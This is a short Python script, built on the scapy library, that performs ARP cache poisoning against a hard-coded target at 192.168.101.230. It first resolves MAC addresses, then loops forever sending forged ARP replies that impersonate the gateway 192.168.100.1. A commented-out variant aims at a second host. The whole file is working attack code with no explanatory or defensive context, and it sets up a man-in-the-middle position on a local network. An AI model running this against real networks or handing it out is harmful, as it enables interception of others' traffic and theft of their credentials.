from scapy.all import Ether, ARP, sendp, send, srp
import time
import sys


def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
    print(f"Failed to get MAC address for {ip}")
    return None


def poisoning_done(target_ip, target_mac, host_ip, host_mac):
    pkt2target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=host_ip)
    pkt2host = Ether(dst=host_mac) / ARP(op=2, pdst=host_ip, psrc=target_ip)
    while True:
        sendp(pkt2target, verbose=False)
        time.sleep(1)


def main(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    if target_mac is None:
        sys.exit(1)
    if host_mac is None:
        sys.exit(1)

    print(f"Start: {target_ip}({target_mac}) <--> {host_ip}({host_mac})")

    try:
        poisoning_done(target_ip, target_mac, host_ip, host_mac)
    except KeyboardInterrupt:
        sys.exit(0)


main("192.168.101.230", "192.168.100.1")
# while True:
#     poisoning_done("192.168.101.35", "ff:ff:ff:ff:ff:ff", "192.168.100.1", "00:0c:29:8b:9d:68")
#     time.sleep(1)
